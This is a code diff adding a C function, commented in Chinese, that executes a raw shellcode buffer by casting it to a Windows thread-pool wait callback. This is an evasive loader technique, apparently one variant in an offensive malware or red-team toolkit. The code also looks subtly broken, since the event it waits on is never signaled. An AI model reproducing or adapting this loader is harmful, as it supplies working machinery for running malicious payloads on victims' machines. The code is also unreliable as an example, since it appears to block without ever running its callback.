@@ -1,0 +1,22 @@
+// 线程池等待加载方式：使用线程池等待对象执行Shellcode
+void ExecuteLoader(PBYTE shellcode, SIZE_T shellcodeSize) {
+#ifdef _DEBUG
+    printf("[*] 线程池等待方式执行Shellcode\n");
+#endif
+    HANDLE hEvent = CreateEvent(NULL, FALSE, FALSE, NULL);
+    if (!hEvent) return;
+    
+    PTP_WAIT waitObj = CreateThreadpoolWait(
+        (PTP_WAIT_CALLBACK)shellcode,
+        NULL,
+        NULL
+    );
+    
+    if (waitObj) {
+        SetThreadpoolWait(waitObj, hEvent, NULL);
+        WaitForSingleObject(hEvent, INFINITE);
+        CloseThreadpoolWait(waitObj);
+    }
+    
+    CloseHandle(hEvent);
+}
